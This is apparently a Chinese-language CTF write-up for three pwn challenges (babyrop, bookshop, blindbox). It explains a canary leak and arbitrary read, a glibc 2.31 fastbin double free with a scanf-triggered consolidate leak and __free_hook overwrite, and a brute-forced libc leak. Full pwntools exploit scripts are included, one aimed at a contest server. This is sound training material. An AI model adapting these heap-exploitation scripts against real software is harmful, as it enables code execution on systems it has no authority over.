babyrop

可以控制rbp和ret的简单栈溢出,没开启PIE

一开始输入name输入25字节带出canary,接下来第一反应时往bss段上栈迁移,

但是ayoung大爹注意到返回到程序段上的printf(“%s”,arg1);处,控制rbp的值之后可以做到任意地址泄露

只要泄露got表就得到libc,然后返回到onegadget就能getshell

bookshop

glibc-2.31的题,使用luckynum限制了整个程序只能申请一个大小的chunk,

同时没有edit功能,但是存在UAF漏洞

利用思路是利用fastbin的doublefree构造任意地址写,

同时考虑到fastbin没法泄露libc地址,但是scanf函数再输入很大一堆数据的时候会在heap上开辟缓冲区,

这样只要scanf开辟的缓冲区足够大,就可以申请一个largebin大小的chunk,

同时每当程序申请largebin大小的chunk的时候,会调用malloc_consolidate使得fastbin合并

这样我们首先在fastbin的大小填满tcahce,然后再在fastbin触发合并,泄露libc,doublefree任意地址写free_hook即可getshell

exp:

# -*- coding: UTF-8 -*-

from pwn import *
context(os='linux',arch='amd64')
elf = ELF("./bookshop")
libc = ELF('./libc-2.31.so')

loacl = 0
context.log_level = 'debug'

if loacl:
  p = process("./bookshop")
else:
  p = remote("123.57.131.167","39789")

def loginfo(data,addr):
  log.success(data+" ==> "+hex(addr))

def cmd(c):
  p.sendlineafter(">>",str(c))

def add(data):
  cmd(1)
  p.sendlineafter("Write something in the Book",data)

def free(idx):
  cmd(2)
  p.sendlineafter("want to take out from you bag?",str(idx))

def show(idx):
  cmd(3)
  p.sendlineafter("Which Book do you want to read?",str(idx))


p.sendlineafter("number?",str(0x78))

for i in range(12):
  add("/bin/sh\x00")

for i in range(7+3):
  free(i)

payload = "0"*0x500
p.sendlineafter(">>",payload)
show(7)
p.recvuntil("Content: ")
addr = u64(p.recv(6).ljust(8,'\x00'))
loginfo("addr",addr)
libc_base = addr - libc.sym['__malloc_hook']-0x10-464
loginfo("libc_base",libc_base)

free(10)
free(11)
free(10)

for i in range(7):
  add("/bin/sh\x00")

add(p64(libc_base+libc.sym['__free_hook']))

add("/bin/sh\x00")
add("/bin/sh\x00")
add(p64(libc_base+libc.sym['system']))
free(10)

# gdb.attach(p)
p.interactive()

blindbox

限制了3个luckynum,也就是三个size大小的chunk,只能show一次而且不能有'\x7f',本意应该是不让泄露libc地址,但是libc地址随机化有几率是以'\x7e'开头,从而直接绕过然后拿到system地址.pay功能实现getshell

这题本意应该是想考tcache stash unlink,但是本菜鸡比赛的时候学了半天没学会(

# -*- coding: UTF-8 -*-

from pwn import *
context(os='linux',arch='amd64')
libc = ELF('./libc-2.31.so')
# context.log_level = 'debug'

def pwn():
  p = process("./Blindbox")

  def cmd(cmd):
    p.sendlineafter(">>",str(cmd))

  def choose(num_idx,box_idx):
    cmd(1)
    p.sendlineafter(">>",str(num_idx))
    p.sendlineafter("Blindbox(1-3):",str(box_idx))

  def drop(idx):
    cmd(2)
    p.sendlineafter("Which index do you want to drop?",str(idx))

  def edit(idx,data):
    cmd(4)
    p.sendlineafter("Which Blindbox do you want to change?",str(idx))
    p.sendlineafter("content:",data)

  def show(idx):
    cmd(3)
    p.sendlineafter("Which Blindbox do you want to open?",str(idx))

  p.sendlineafter("your name:","Mark")
  num = [0x100,0x88,0x233] # size
  p.sendlineafter("The first lucky number?",str(num[0]))
  p.sendlineafter("The second lucky number?",str(num[1]))
  p.sendlineafter("The third lucky number?",str(num[2]))

  choose(1,1)
  choose(1,2)
  choose(1,3)
  drop(1)
  drop(2)
  drop(3)
  choose(1,1)
  choose(1,2)
  choose(1,3)
  drop(1)
  drop(2)
  drop(3)
  choose(1,1)
  choose(1,2)
  choose(1,3)
  drop(1)
  drop(2)
  show(2)
  p.recvline()
  addr = p.recvline()
  if '\x7e' not in addr:
    print "#==>",addr
    p.close()
    pass
  else:
    print "#==>",addr
    addr = addr[26:26+6]
    addr = u64(addr.ljust(8,'\x00'))
    print "##==>",hex(addr)
    libc_base = addr-libc.sym['__malloc_hook']-0x10-96
    print "###==>",hex(libc_base)
    system_addr = libc_base+libc.sym['system']
    print "####==>",hex(system_addr)

    cmd(6)
    num = [1804289383,846930886,1681692777,1714636915,1957747793,424238335,719885386,1649760492]
    for i in range(8):
      guess = num[i]^int(system_addr)
      p.sendlineafter("guess>",str(guess))

    # gdb.attach(p)
    p.interactive()

while True:
  pwn()
